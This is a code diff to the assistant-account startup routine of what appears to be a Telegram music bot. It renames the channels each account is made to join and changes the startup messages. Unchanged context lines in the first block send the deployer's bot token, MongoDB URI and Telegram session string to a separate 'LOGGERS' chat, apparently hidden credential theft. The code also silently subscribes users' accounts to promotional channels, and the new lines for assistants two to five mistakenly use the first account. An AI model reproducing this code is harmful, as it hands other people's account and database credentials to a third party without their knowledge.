@@ -65,16 +65,15 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("deathking_botworld")
-                await self.one.join_chat("deathmovie_hub")
-                await self.one.join_chat("TryToLiveAlon")
-                await self.one.join_chat("deathking_worldd")
+                await self.one.join_chat("STORM_CHATZ")
+                await self.one.join_chat("STORM_TECHH")
+                await self.one.join_chat("TORNADO_TRIBE")
 
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "🔵 ᴀꜱꜱɪꜱᴛᴀɴᴛ ᴏɴᴇ : ᴏɴʟɪɴᴇ\n\nᴀᴄᴛɪᴠᴀᴛɪɴɢ ᴀꜱꜱɪꜱᴛᴀɴᴛ ᴛᴡᴏ...")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
@@ -95,15 +94,14 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("deathking_botworld")
-                await self.two.join_chat("deathmovie_hub")
-                await self.two.join_chat("TryToLiveAlon")
-                await self.two.join_chat("deathking_worldd")
+                await self.one.join_chat("STORM_CHATZ")
+                await self.one.join_chat("STORM_TECHH")
+                await self.one.join_chat("TORNADO_TRIBE")
             except:
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.two.send_message(config.LOGGER_ID, "🔵 ᴀꜱꜱɪꜱᴛᴀɴᴛ ᴛᴡᴏ : ᴏɴʟɪɴᴇ\n\nᴀᴄᴛɪᴠᴀᴛɪɴɢ ᴀꜱꜱɪꜱᴛᴀɴᴛ ᴛʜʀᴇᴇ...")
 
             except:
                 LOGGER(__name__).error(
@@ -119,15 +117,14 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("deathking_botworld")
-                await self.three.join_chat("deathmovie_hub")
-                await self.three.join_chat("deathking_worldd")
-                await self.three.join_chat("TryToLiveAlon")
+                await self.one.join_chat("STORM_CHATZ")
+                await self.one.join_chat("STORM_TECHH")
+                await self.one.join_chat("TORNADO_TRIBE")
             except:
                 pass
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.three.send_message(config.LOGGER_ID, "🔵 ᴀꜱꜱɪꜱᴛᴀɴᴛ ᴛʜʀᴇᴇ : ᴏɴʟɪɴᴇ\n\nᴀᴄᴛɪᴠᴀᴛɪɴɢ ᴀꜱꜱɪꜱᴛᴀɴᴛ ꜰᴏᴜʀ...")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -142,15 +139,14 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("deathking_botworld")
-                await self.four.join_chat("deathmovie_hub")
-                await self.four.join_chat("deathking_worldd")
-                await self.four.join_chat("TryToLiveAlon")
+                await self.one.join_chat("STORM_CHATZ")
+                await self.one.join_chat("STORM_TECHH")
+                await self.one.join_chat("TORNADO_TRIBE")
             except:
                 pass
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.four.send_message(config.LOGGER_ID, "🔵 ᴀꜱꜱɪꜱᴛᴀɴᴛ ꜰᴏᴜʀ : ᴏɴʟɪɴᴇ\n\nᴀᴄᴛɪᴠᴀᴛɪɴɢ ᴀꜱꜱɪꜱᴛᴀɴᴛ ꜰɪᴠᴇ...")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -165,15 +161,14 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("deathking_botworld")
-                await self.five.join_chat("deathmovie_hub")
-                await self.five.join_chat("deathking_worldd")
-                await self.five.join_chat("TryToLiveAlon")
+                await self.one.join_chat("STORM_CHATZ")
+                await self.one.join_chat("STORM_TECHH")
+                await self.one.join_chat("TORNADO_TRIBE")
             except:
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
+                await self.five.send_message(config.LOGGER_ID, "🔵 ᴀꜱꜱɪꜱᴛᴀɴᴛ ꜰɪᴠᴇ : ᴏɴʟɪɴᴇ\n\nᴀʟʟ ᴀꜱꜱɪꜱᴛᴀɴᴛꜱ ᴀʀᴇ ɴᴏᴡ ᴀᴄᴛɪᴠᴇ 🎶")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
